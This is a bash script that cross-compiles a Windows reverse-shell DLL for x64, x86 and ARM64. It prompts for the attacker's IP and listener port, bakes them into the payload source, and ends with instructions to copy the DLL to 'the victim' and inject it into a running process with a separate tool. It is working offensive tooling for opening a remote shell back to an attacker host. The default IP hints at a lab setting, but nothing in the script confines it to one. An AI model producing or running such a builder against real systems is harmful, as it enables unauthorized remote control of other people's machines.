#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# build_revshell_dll.sh — interactive cross-compiler for revshell_pure_dll.dll
#
# Prompts for LHOST / LPORT (remembers your last answers in a .conf next to
# this script), shows a numbered arch menu (x64 / x86 / ARM64 / all), and
# writes revshell_<arch>.dll into reverse-shell/.
#
# - Uses mingw-w64 for x64/x86 (apt install mingw-w64 if missing).
# - Needs llvm-mingw for ARM64 (not in apt). The script prints the URL if
#   the ARM64 compiler isn't on PATH.
# - LHOST/LPORT substitution is done against a temp copy of the source, so
#   the committed .cpp is NEVER modified.
# ---------------------------------------------------------------------------

set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
SRC="$HERE/reverse-shell/revshell_pure_dll.cpp"
OUT_DIR="$HERE/reverse-shell"
CONF="$HERE/build_revshell_dll.conf"

# ---- defaults ----
DEF_LHOST="10.10.14.1"
DEF_LPORT="4444"

# load previous answers if the conf exists
LHOST=""; LPORT=""
[[ -f "$CONF" ]] && source "$CONF"
LHOST="${LHOST:-$DEF_LHOST}"
LPORT="${LPORT:-$DEF_LPORT}"

# ---- colors (auto-off when stdout is not a TTY) ----
if [[ -t 1 ]]; then
    G='\033[92m'; R='\033[91m'; Y='\033[93m'; C='\033[96m'; B='\033[1m'; N='\033[0m'
else
    G=''; R=''; Y=''; C=''; B=''; N=''
fi

banner() {
    echo
    echo -e "${G}${B}================================================================${N}"
    echo -e "${G}${B}  revshell_pure_dll.dll  —  interactive cross-compiler${N}"
    echo -e "${G}${B}================================================================${N}"
    echo
}

prompt() {
    # $1 = label, $2 = default
    local v
    read -r -p "$(echo -e "${Y}?${N} $1 [${C}$2${N}]: ")" v
    echo "${v:-$2}"
}

check_prereq_mingw() {
    if ! command -v x86_64-w64-mingw32-g++ >/dev/null 2>&1 \
       || ! command -v i686-w64-mingw32-g++ >/dev/null 2>&1; then
        echo -e "${Y}[*]${N} mingw-w64 missing; running: sudo apt install -y mingw-w64"
        sudo apt install -y mingw-w64
    fi
}

check_prereq_llvm_mingw() {
    if ! command -v aarch64-w64-mingw32-g++ >/dev/null 2>&1; then
        echo -e "${R}[!]${N} aarch64-w64-mingw32-g++ not found (llvm-mingw required for ARM64)"
        echo    "    Download:  https://github.com/mstorsjo/llvm-mingw/releases/latest"
        echo    "    Extract, then: export PATH=\"\$PWD/llvm-mingw-*/bin:\$PATH\""
        echo    "    Re-run this script."
        return 1
    fi
}

compiler_for() {
    case "$1" in
        x64)   echo "x86_64-w64-mingw32-g++" ;;
        x86)   echo "i686-w64-mingw32-g++"   ;;
        arm64) echo "aarch64-w64-mingw32-g++" ;;
    esac
}

build_one() {
    local arch="$1"
    local out="$OUT_DIR/revshell_${arch}.dll"
    local tmp; tmp="$(mktemp --suffix=.cpp)"
    trap "rm -f '$tmp'" RETURN

    # Substitute LHOST/LPORT in a temp copy only (committed source untouched).
    sed -e "s|LHOST = \"[^\"]*\"|LHOST = \"$LHOST\"|" \
        -e "s|LPORT = [0-9][0-9]*|LPORT = $LPORT|" \
        "$SRC" > "$tmp"

    local cxx; cxx="$(compiler_for "$arch")"

    echo
    echo -e "${G}[+]${N} building  ${C}$arch${N}  ->  ${C}$out${N}"
    echo -e "    LHOST=${C}$LHOST${N}  LPORT=${C}$LPORT${N}  compiler=${C}$cxx${N}"

    if "$cxx" -shared -O2 -s -o "$out" "$tmp" -lws2_32 \
              -Wl,--subsystem,windows,--kill-at; then
        local bytes; bytes="$(stat -c '%s' "$out" 2>/dev/null || wc -c < "$out")"
        echo -e "    ${G}${B}ok${N}  $(printf '%d' "$bytes") bytes"
    else
        echo -e "    ${R}${B}fail${N}"
        return 1
    fi
}

save_conf() {
    cat > "$CONF" <<EOF
# written by build_revshell_dll.sh — edit or delete freely
LHOST="$LHOST"
LPORT="$LPORT"
EOF
}

main() {
    banner

    [[ -f "$SRC" ]] || { echo -e "${R}[!]${N} source not found: $SRC"; exit 1; }
    echo -e "${G}[+]${N} source : ${C}$SRC${N}"
    echo -e "${G}[+]${N} output : ${C}$OUT_DIR/revshell_<arch>.dll${N}"

    LHOST="$(prompt "LHOST (attacker IP)" "$LHOST")"
    LPORT="$(prompt "LPORT (listener port)" "$LPORT")"

    echo
    echo "Pick architecture:"
    echo -e "  ${C}1${N})  x64    (AMD64 — 99% of modern Windows targets)"
    echo -e "  ${C}2${N})  x86    (32-bit / WOW64 — legacy apps)"
    echo -e "  ${C}3${N})  ARM64  (Surface Pro X, newer ARM laptops)"
    echo -e "  ${C}4${N})  all three"
    choice="$(prompt "choice" "1")"

    case "$choice" in
        1) ARCHES=(x64)              ;;
        2) ARCHES=(x86)              ;;
        3) ARCHES=(arm64)            ;;
        4) ARCHES=(x64 x86 arm64)    ;;
        *) echo -e "${R}[!]${N} invalid choice"; exit 1 ;;
    esac

    # install cross-compilers as needed
    for a in "${ARCHES[@]}"; do
        case "$a" in
            x64|x86) check_prereq_mingw ;;
            arm64)   check_prereq_llvm_mingw || exit 1 ;;
        esac
    done

    for a in "${ARCHES[@]}"; do
        build_one "$a"
    done

    save_conf

    echo
    echo -e "${G}${B}[+] done${N}  (settings saved to ${C}$CONF${N})"
    ls -lh "$OUT_DIR"/revshell_*.dll 2>/dev/null | sed 's/^/    /'
    echo
    echo -e "${Y}next:${N}  copy the .dll(s) to the victim; then on victim run:"
    echo -e "        ${C}pop_x64.exe <PID> --dll revshell_x64.dll${N}"
    echo -e "        (pop auto-switches to revshell_x86.dll if target is 32-bit)"
    echo
}

main "$@"
